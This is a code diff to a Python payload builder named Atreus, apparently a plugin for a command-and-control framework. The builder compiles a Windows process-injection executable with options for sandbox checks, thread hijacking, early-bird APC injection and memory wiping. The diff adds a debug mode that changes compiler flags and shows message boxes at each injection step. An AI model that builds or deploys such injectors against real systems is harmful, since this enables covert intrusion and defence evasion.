@@ -104,6 +104,12 @@ class Atreus(PayloadType):
             description="Zero payload in heap after injection",
             default_value=True,
         ),
+        BuildParameter(
+            name="debug_mode",
+            parameter_type=BuildParameterType.Boolean,
+            description="Debug mode: MessageBox at each injection step (do NOT use in production)",
+            default_value=False,
+        ),
     ]
 
     agent_code_path = pathlib.Path(__file__).parent.parent / "agent_code"
@@ -127,6 +133,7 @@ class Atreus(PayloadType):
         use_sandbox      = self.get_parameter("use_sandbox_check") or False
         use_thread_hijack = self.get_parameter("use_thread_hijack") or False
         wipe_memory      = self.get_parameter("wipe_memory") or False
+        debug_mode       = self.get_parameter("debug_mode") or False
 
         # Generate key
         key_bytes = enc_key_param.encode() if enc_key_param else \
@@ -185,17 +192,27 @@ class Atreus(PayloadType):
         if wipe_memory:
             defines.append("-DUSE_WIPE")
 
+        extra_libs = ""
+        if debug_mode:
+            defines.append("-DATREUS_DEBUG")
+
         with tempfile.TemporaryDirectory() as tmp:
             src_path = os.path.join(tmp, "Atreus_Main.cpp")
             exe_path = os.path.join(tmp, "Atreus.exe")
             with open(src_path, "w") as f:
                 f.write(src)
 
+            if debug_mode:
+                subsystem = ""       # console subsystem - main() entry point
+                opt_flags = "-O0"    # no strip, no optim for readability
+            else:
+                subsystem = "-mwindows -s"
+                opt_flags = "-O2"
             cmd = (
                 f"x86_64-w64-mingw32-g++ {src_path} -o {exe_path} "
-                f"-std=c++17 -O2 -s -mwindows -lntdll -static "
+                f"-std=c++17 {opt_flags} {subsystem} -lntdll -static "
                 f"-fno-exceptions -fno-rtti -w "
-                f"{' '.join(defines)}"
+                f"{' '.join(defines)} {extra_libs}"
             )
             proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             stdout, stderr = proc.communicate()
@@ -222,6 +239,7 @@ class Atreus(PayloadType):
                 if use_thread_hijack: features.append("thread-hijack")
                 else:                features.append("early-bird-APC")
                 if wipe_memory:      features.append("wipe")
+                if debug_mode:       features.append("DEBUG")
                 resp.message = f"Atreus [{', '.join(features)}] -> {target_process}"
 
         return resp
